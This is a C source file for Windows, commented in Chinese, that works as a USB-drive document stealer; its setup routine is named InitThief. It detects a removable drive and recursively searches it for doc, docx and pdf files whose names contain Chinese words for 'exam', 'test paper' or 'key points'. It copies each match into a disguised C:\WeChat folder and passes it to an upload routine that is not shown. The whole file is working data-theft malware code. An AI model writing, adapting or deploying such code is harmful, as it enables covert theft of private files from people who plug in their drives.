#include "stdafx.h"
#include <string.h>
#include "Shlwapi.h"


#pragma comment(lib, "Shlwapi.lib")

#define MY_DIRECTORY TEXT("C:\\WeChat")
//这个目录用于保存文件


//函数： void getUDiskLetter()
//功能： 获得U盘盘符
//参数： UDiskPath用于接收U盘盘符
//返回值： TRUE表示获取成功
BOOL getUDiskLetter(TCHAR *UDiskPath)
{
	DWORD letters;
	TCHAR drivePath[5] = TEXT("A:\\");
	letters = GetLogicalDrives();
	while(letters != 0)
	{
		if((letters & 1) && (GetDriveType(drivePath) == DRIVE_REMOVABLE))
		{
		//	MessageBox(NULL, drivePath, TEXT("GET IT"), MB_OK);
			lstrcpy(UDiskPath, drivePath);
			return TRUE;
		}
		drivePath[0]++;
		letters >>= 1;
	}
	return FALSE;
}

extern void getFile(TCHAR *fileName);


//函数： BOOL CheckFile(TCHAR *path)
//功能： 枚举某个盘符的目录结构，判断是否是存在目标文件，然后保存
BOOL CheckFile(TCHAR *path)
{
	WIN32_FIND_DATA dat;
	HANDLE hFind;
	TCHAR sPath[MAX_PATH]; 
	TCHAR sPathwc[MAX_PATH]; //用于存放生成包含通配符的路径
	TCHAR szTemp[MAX_PATH];

	ZeroMemory(sPath, MAX_PATH);
	ZeroMemory(sPathwc, MAX_PATH);

	wsprintf(sPathwc, TEXT("%s%s"), path, TEXT("\\*.*"));
	lstrcpy(sPath, path);

	hFind = FindFirstFile(sPathwc, &dat);
	if (INVALID_HANDLE_VALUE == hFind)
    {
        return FALSE;
    }
	do
	{
		if(dat.cFileName[0] != '.')
		{
			if(FILE_ATTRIBUTE_DIRECTORY & dat.dwFileAttributes)//如果是文件夹
			{
				wsprintf(sPath, TEXT("%s%s%s"), path, TEXT("\\"), dat.cFileName);
				CheckFile(sPath);//递归
			}
			else
			{
				//普通文件
				ZeroMemory(szTemp, MAX_PATH);
				wsprintf(szTemp, TEXT("%s%s%s"), path, TEXT("\\"), dat.cFileName);
				getFile(szTemp);
			}
		}
	}while(FindNextFile(hFind, &dat));

	FindClose(hFind);

	return TRUE;
}


//函数： void wide2ansi(TCHAR *wide, char *ansi)
//功能： 宽字符转为ascii字符
//参数： wide为传入的宽字符串，ansi用于接收生成的ASCII字符串
void wide2ansi(TCHAR *wide, char *ansi)
{
	WideCharToMultiByte(CP_ACP, NULL, wide, sizeof(TCHAR) * lstrlen(wide), ansi, MAX_PATH, NULL, NULL);
	//大小应标注出sizeof(TCHAR) * lstrlen(wide)
}


//函数： void isTarget()
//功能： 判断某个文件是否是包含了关键字的目标文件
//参数： fileName为包含了后缀的文件名
//返回值： 如果是指定类型文件，则返回TRUE
BOOL isTarget(char *fileName)
{
	int i, j;
	char *targetName[6] = {"重点", "考试", "试卷"};
	char *targetExe[6] = {"doc", "docx", "pdf"};
	for(i = 0; i < 3; i++)
	{
		if(strstr(fileName, targetName[i]) != NULL)
		{
			
			for(j = 0; j < 3; j++)
			{
				if(strstr(fileName, targetExe[j]) != NULL)
				{
					return TRUE;
				}
			}

		}
	}
	return FALSE;
}


extern BOOL UploadViaNewThread(TCHAR *file);

TCHAR *fileToSave[MAX_PATH] = {0}; //先将U盘上的文件保存到本地硬盘的这个位置
int i = 0;

//功能：如果是需要的文件则保存
void getFile(TCHAR *fileName)
{
	char fileNameAnsi[MAX_PATH];
	//TCHAR fileToSave[MAX_PATH] = TEXT("\0"); //先将U盘上的文件保存到这里

	
	wide2ansi(fileName, fileNameAnsi);
	if(isTarget(fileNameAnsi))//如果是目标文件
	{
		//分配内存用于存放复制后的文件的路径
		fileToSave[i] = (TCHAR*)malloc(sizeof(TCHAR) * MAX_PATH);
		ZeroMemory(fileToSave[i], MAX_PATH);

		lstrcat(fileToSave[i], MY_DIRECTORY);
		lstrcat(fileToSave[i], TEXT("\\"));
		lstrcat(fileToSave[i], PathFindFileName(fileName));

		//开始保存 
		CopyFile(fileName, fileToSave[i], FALSE);
		UploadViaNewThread(fileToSave[i]);
		//	Sleep(4000);//等待一下，否则创建线程后就进行下一次循环，fileTosave将发生变化

		i++;//使用下一个字符数组保存下一个文件名，这样上一个文件名传给新线程之后也会保持不变
	}

	
}

//初始化
void InitThief()
{
	//创建文件夹用于保存
	CreateDirectory(MY_DIRECTORY, NULL);
	while(i-- && i >= 0)//如果先前有保存过就置零
	{
		ZeroMemory(fileToSave[i], MAX_PATH);
	}
	i = 0;
}

/*
void test()
{
	InitThief();

	CheckFile(TEXT("D:\\"));

}
*/